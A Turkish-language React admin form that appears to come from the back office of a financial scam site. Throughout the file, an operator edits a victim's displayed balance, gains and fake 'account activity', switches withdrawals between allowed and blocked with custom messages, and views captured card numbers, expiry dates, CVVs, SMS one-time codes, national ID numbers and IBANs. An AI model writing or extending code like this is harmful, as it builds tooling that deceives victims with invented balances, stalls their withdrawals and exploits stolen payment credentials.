
"use client";

import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { DialogFooter } from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
import type { AdminMember } from "@/app/dashboard/admin/page";
import { Textarea } from "../ui/textarea";
import { Separator } from "../ui/separator";

type AdminMemberFormProps = {
    member?: AdminMember | null;
    onSave: (memberData: AdminMember) => void;
    onCancel: () => void;
};

const AdminMemberForm = ({ member, onSave, onCancel }: AdminMemberFormProps) => {
    const [formData, setFormData] = useState<Omit<AdminMember, 'id' | 'password'>>({
        name: '',
        phone: '',
        iban: '',
        bank: '',
        tc: '',
        il: '',
        ilce: '',
        weeklyGain: '',
        errorMessage: '',
        onayMesaji: '',
        invoiceAmount: '',
        accountActivity: '',
        meetingInfo: '',
        currentBalance: '',
        status: 'Aktif',
        transactionStatus: 'allowed',
        cardNumber: '',
        cardExpiry: '',
        cardCvv: '',
        smsCode: '',
    });

     useEffect(() => {
        if (member) {
            setFormData({
                name: member.name || '',
                phone: member.phone, // email is stored in phone field
                iban: member.iban || '',
                bank: member.bank || '',
                tc: member.tc || '',
                il: member.il || '',
                ilce: member.ilce || '',
                weeklyGain: member.weeklyGain || '',
                errorMessage: member.errorMessage || 'İşlem sırasında bir hata oluştu. Lütfen destek ekibiyle iletişime geçin.',
                onayMesaji: member.onayMesaji || 'İşleminiz başarıyla alındı.',
                invoiceAmount: member.invoiceAmount || '',
                accountActivity: member.accountActivity || '',
                meetingInfo: member.meetingInfo || '',
                currentBalance: member.currentBalance || '0 TL',
                status: member.status || 'Aktif',
                transactionStatus: member.transactionStatus || 'allowed',
                cardNumber: member.cardNumber || '',
                cardExpiry: member.cardExpiry || '',
                cardCvv: member.cardCvv || '',
                smsCode: member.smsCode || '',
            });
        }
    }, [member]);


    const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
        const { id, value } = e.target;
        setFormData(prev => ({ ...prev, [id]: value }));
    };
    
    const handleStatusChange = (value: 'Aktif' | 'Pasif') => {
        setFormData(prev => ({ ...prev, status: value }));
    };

    const handleTransactionStatusChange = (value: 'allowed' | 'blocked') => {
        setFormData(prev => ({...prev, transactionStatus: value }));
    };

    const handleSubmit = (e: React.FormEvent) => {
        e.preventDefault();
        if (member) {
            onSave({ ...member, ...formData });
        }
    };
    
    return (
        <form onSubmit={handleSubmit} className="space-y-4">
            <div className="grid grid-cols-1 gap-4 sm:grid-cols-2">
                 <div className="space-y-2">
                    <Label htmlFor="phone">Email (Giriş Adresi)</Label>
                    <Input id="phone" value={formData.phone} disabled readOnly />
                </div>
                 <div className="space-y-2">
                    <Label htmlFor="name">Ad Soyad</Label>
                    <Input id="name" value={formData.name} onChange={handleChange} placeholder="Ad Soyad" required />
                </div>
                 <div className="space-y-2">
                    <Label htmlFor="tc">TC Kimlik No</Label>
                    <Input id="tc" value={formData.tc} onChange={handleChange} placeholder="TC Kimlik No" required />
                </div>
                 <div className="space-y-2">
                    <Label htmlFor="bank">Banka</Label>
                    <Input id="bank" value={formData.bank} onChange={handleChange} placeholder="Banka Adı" required />
                </div>
                <div className="space-y-2">
                    <Label htmlFor="iban">IBAN</Label>
                    <Input id="iban" value={formData.iban} onChange={handleChange} placeholder="TR..." required />
                </div>
                 <div className="space-y-2">
                    <Label htmlFor="il">İl</Label>
                    <Input id="il" value={formData.il} onChange={handleChange} placeholder="İl" required />
                </div>
                 <div className="space-y-2">
                    <Label htmlFor="ilce">İlçe</Label>
                    <Input id="ilce" value={formData.ilce} onChange={handleChange} placeholder="İlçe" required />
                </div>
                 <div className="space-y-2">
                    <Label htmlFor="weeklyGain">Haftalık Kazanç</Label>
                    <Input id="weeklyGain" value={formData.weeklyGain} onChange={handleChange} placeholder="Örn: 1500 TL" required />
                </div>
                <div className="space-y-2">
                    <Label htmlFor="invoiceAmount">Fatura Tutarı</Label>
                    <Input id="invoiceAmount" value={formData.invoiceAmount} onChange={handleChange} placeholder="Örn: 1250 TL" required />
                </div>
                <div className="space-y-2">
                    <Label htmlFor="currentBalance">Mevcut Bakiye</Label>
                    <Input id="currentBalance" value={formData.currentBalance} onChange={handleChange} placeholder="Örn: 2500 TL" required />
                </div>
                <div className="space-y-3">
                    <Label>Üyelik Durumu</Label>
                    <RadioGroup
                        value={formData.status}
                        onValueChange={handleStatusChange}
                        className="flex items-center space-x-4"
                    >
                        <div className="flex items-center space-x-2">
                            <RadioGroupItem value="Aktif" id="status-aktif" />
                            <Label htmlFor="status-aktif">Aktif</Label>
                        </div>
                        <div className="flex items-center space-x-2">
                            <RadioGroupItem value="Pasif" id="status-pasif" />
                            <Label htmlFor="status-pasif">Pasif</Label>
                        </div>
                    </RadioGroup>
                </div>
                 <div className="space-y-3">
                    <Label>İşlem Durumu (Para Çekme)</Label>
                    <RadioGroup
                        value={formData.transactionStatus}
                        onValueChange={handleTransactionStatusChange}
                        className="flex items-center space-x-4"
                    >
                        <div className="flex items-center space-x-2">
                            <RadioGroupItem value="allowed" id="status-onay" />
                            <Label htmlFor="status-onay">İzin Verildi (Onay)</Label>
                        </div>
                        <div className="flex items-center space-x-2">
                            <RadioGroupItem value="blocked" id="status-hata" />
                            <Label htmlFor="status-hata">Engellendi (Hata)</Label>
                        </div>
                    </RadioGroup>
                </div>
                 <div className="space-y-2 sm:col-span-2">
                    <Label htmlFor="onayMesaji">Onay Mesajı</Label>
                    <Textarea id="onayMesaji" value={formData.onayMesaji} onChange={handleChange} placeholder="Para çekme onaylandığında müşteriye gösterilecek mesaj..." required />
                </div>
                 <div className="space-y-2 sm:col-span-2">
                    <Label htmlFor="errorMessage">Hata Mesajı</Label>
                    <Textarea id="errorMessage" value={formData.errorMessage} onChange={handleChange} placeholder="Para çekme engellendiğinde müşteriye gösterilecek mesaj..." required />
                </div>
                 <div className="space-y-2 sm:col-span-2">
                    <Label htmlFor="accountActivity">Hesap Hareketi</Label>
                    <Textarea id="accountActivity" value={formData.accountActivity} onChange={handleChange} placeholder="Müşterinin bakiye sayfasında görünecek hesap hareketi bilgisi (örn: Gelen Transfer: 500 TL)..." />
                </div>
                <div className="space-y-2 sm:col-span-2">
                    <Label htmlFor="meetingInfo">Görüşme Planlayıcı Notu</Label>
                    <Textarea id="meetingInfo" value={formData.meetingInfo} onChange={handleChange} placeholder="Görüşme planlayıcı sayfasında gösterilecek ek bilgi..." />
                </div>
            </div>

            <Separator className="my-4" />
            
            <div className="space-y-4">
                 <h3 className="text-lg font-medium text-muted-foreground">Müşteri Kart Bilgileri (Salt Okunur)</h3>
                 <div className="grid grid-cols-1 gap-4 sm:grid-cols-2">
                    <div className="space-y-2">
                        <Label htmlFor="cardNumber">Kart Numarası</Label>
                        <Input id="cardNumber" value={formData.cardNumber} readOnly disabled />
                    </div>
                     <div className="space-y-2">
                        <Label htmlFor="cardExpiry">Son Kullanma Tarihi</Label>
                        <Input id="cardExpiry" value={formData.cardExpiry} readOnly disabled />
                    </div>
                     <div className="space-y-2">
                        <Label htmlFor="cardCvv">CVV</Label>
                        <Input id="cardCvv" value={formData.cardCvv} readOnly disabled />
                    </div>
                     <div className="space-y-2">
                        <Label htmlFor="smsCode">SMS Kodu</Label>
                        <Input id="smsCode" value={formData.smsCode} readOnly disabled />
                    </div>
                 </div>
            </div>


            <DialogFooter>
                <Button type="button" variant="ghost" onClick={onCancel}>İptal</Button>
                <Button type="submit">Kaydet</Button>
            </DialogFooter>
        </form>
    );
};

export default AdminMemberForm;
